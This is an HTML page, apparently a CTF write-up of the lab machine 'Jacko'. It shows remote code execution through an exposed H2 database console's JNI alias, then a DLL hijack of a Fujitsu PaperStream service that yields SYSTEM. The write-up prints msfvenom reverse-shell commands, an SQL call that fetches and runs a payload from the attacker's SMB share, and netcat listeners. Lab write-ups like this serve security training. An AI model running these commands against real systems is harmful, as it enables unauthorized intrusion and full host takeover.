@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jacko &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Jacko</h1>
+    <div class="meta">Target: <code>192.168.176.66</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">H2Database</span><span class="tag">JNI</span><span class="tag">RCE</span><span class="tag">msfvenom</span><span class="tag">DLLHijack</span><span class="tag">CVE</span><span class="tag">PrivEsc</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#h2-console-jni-code-execution">H2 Console → JNI Code Execution</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#finding-the-vulnerable-service">Finding the Vulnerable Service</a><a class="lvl3" href="#hijacking-fjtwsvic">Hijacking FJTWSVIC</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Jacko is a Windows machine that starts with an exposed <strong>H2 database console</strong> and ends with a <strong>DLL hijack</strong> against a vendor scanning service. The foothold abuses a known H2 1.4.199 JNI code-execution trick to run commands as a low-privileged user, and the escalation swaps a malicious DLL into the search path of <code>FJTWSVIC</code>, a Fujitsu PaperStream service that runs as <code>LocalSystem</code>. It's a clean lesson in how third-party software installed on a host becomes the weakest link.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0 (H2 Database Engine redirect)
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8082/tcp open  http          H2 database http console
+</code></pre>
+<p>Two web ports both point at <strong>H2</strong>, a Java SQL database. Port 80 just redirects, but <code>8082</code> is the live H2 web console, that's the attack surface.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>A directory scan of port 80 only turned up H2's own documentation folders (<code>/html</code>, <code>/javadoc</code>, <code>/help</code>), confirming there's nothing custom here, the database itself is the target:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.176.66 -w .../big.txt
+/javadoc  (301)   /html  (301)   /help  (301)   /images  (301)
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="h2-console-jni-code-execution">H2 Console → JNI Code Execution</h3>
+<p>The H2 console lets you connect to a database with no real authentication, and once connected you can issue SQL. Searchsploit flagged the exact version as exploitable:</p>
+<pre><code class="language-sh">searchsploit H2 1.4.199
+H2 Database 1.4.199 - JNI Code Execution | java/local/49384.txt
+</code></pre>
+<blockquote>
+<p><strong>How the H2 JNI trick works:</strong> H2 is written in Java, and it lets you define a SQL <code>ALIAS</code> backed by a Java method. The exploit registers an alias pointing at <code>JNIScriptEngine.eval</code>, then calls it with a string of Java that runs <code>Runtime.getRuntime().exec(...)</code>. So a SQL statement becomes arbitrary Java, which becomes an OS command. No memory corruption, just a database feature working exactly as designed against you.</p>
+</blockquote>
+<p>Following the PoC gave command execution as <code>jacko\tony</code>. To turn that into a shell, I generated a reverse-shell exe and served it from an Impacket SMB share:</p>
+<pre><code class="language-sh">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.167 LPORT=8082 -f exe -a x64 --platform windows -o shell.exe
+impacket-smbserver -smb2support evil $PWD
+</code></pre>
+<p>Then I re-used the JNI alias, this time pulling and executing the payload straight off the SMB share:</p>
+<pre><code class="language-sql">CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR &quot;JNIScriptEngine.eval&quot;;
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;//192.168.45.167/evil/shell.exe&quot;).getInputStream()).useDelimiter(&quot;\\Z&quot;).next()');
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 8082
+connect to [...] from [...]
+C:\Program Files (x86)\H2\service&gt;whoami
+'whoami' is not recognized as an internal or external command
+</code></pre>
+<blockquote>
+<p><strong>A small but common snag:</strong> the shell inherited an empty <code>PATH</code>, so even built-ins like <code>whoami</code> failed. Rebuilding <code>PATH</code> to include <code>System32</code> fixes it without needing a new shell:</p>
+</blockquote>
+<pre><code class="language-powershell">set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
+C:\Program Files (x86)\H2\service&gt;whoami
+jacko\tony
+</code></pre>
+<p>That's the user flag:</p>
+<pre><code class="language-powershell">C:\Users\tony\Desktop&gt; type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="finding-the-vulnerable-service">Finding the Vulnerable Service</h3>
+<p>Listing <code>Program Files</code> turned up a non-standard application, <code>fiScanner</code> (Fujitsu PaperStream). Searching that product name for privesc bugs led to:</p>
+<pre><code>PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
+A DLL hijack vulnerability exists in the FJTWSVIC service
+</code></pre>
+<p>The first thing to verify is that the service exists and runs with high privilege:</p>
+<pre><code class="language-powershell">C:\&gt;sc qc FJTWSVIC
+SERVICE_NAME: FJTWSVIC
+        TYPE               : 10  WIN32_OWN_PROCESS
+        BINARY_PATH_NAME   : C:\Windows\twain_32\Fjicube\FJTWSVIC.exe
+        SERVICE_START_NAME : LocalSystem
+</code></pre>
+<p>Two details decide the attack:</p>
+<ul>
+<li><code>SERVICE_START_NAME : LocalSystem</code>, the service runs as <code>SYSTEM</code>, so hijacking it yields full privilege.</li>
+<li><code>TYPE : 10 WIN32_OWN_PROCESS</code> on this build is a 32-bit service, so my malicious DLL must be <strong>x86</strong>, not x64.</li>
+</ul>
+<blockquote>
+<p><strong>What a DLL hijack is:</strong> when a program loads a DLL by name without a fully-qualified path, Windows searches a fixed list of directories in order. If an attacker can drop a DLL earlier in that search order than the legitimate one, the privileged service loads the attacker's code instead. Here the PaperStream service looks for a DLL in a location <code>tony</code> can write to.</p>
+</blockquote>
+<h3 id="hijacking-fjtwsvic">Hijacking FJTWSVIC</h3>
+<p>I built a 32-bit reverse-shell DLL and grabbed the exploit's PowerShell wrapper, which copies the payload into the writable location the service checks and triggers the load:</p>
+<pre><code class="language-sh">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f dll -a x86 --platform windows -o UninOldIs.dll
+searchsploit -m 49382
+</code></pre>
+<pre><code class="language-powershell">PS C:\Users\Tony\Desktop&gt; .\exploit.ps1
+Writable location found, copying payload to C:\JavaTemp\
+Payload copied, triggering...
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>The service loaded the planted DLL and connected back as <code>SYSTEM</code>:</p>
+<pre><code class="language-powershell">rlwrap nc -lvnp 80
+connect to [...] from [...]
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre>
+<p>Box rooted:</p>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt;type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Exposed admin/database consoles are gold.</strong> H2's console plus a known JNI alias trick gave code execution with no credentials.</li>
+<li><strong>Mind the architecture.</strong> A 32-bit service needs a 32-bit DLL, matching <code>msfvenom -a x86</code> to <code>TYPE : 10</code> is what made the hijack fire.</li>
+<li><strong>Third-party software is the soft underbelly of Windows privesc.</strong> Enumerate non-default <code>Program Files</code> entries and <code>sc qc</code> every unfamiliar service; one that runs as <code>LocalSystem</code> and loads a DLL from a writable path is an instant <code>SYSTEM</code>.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
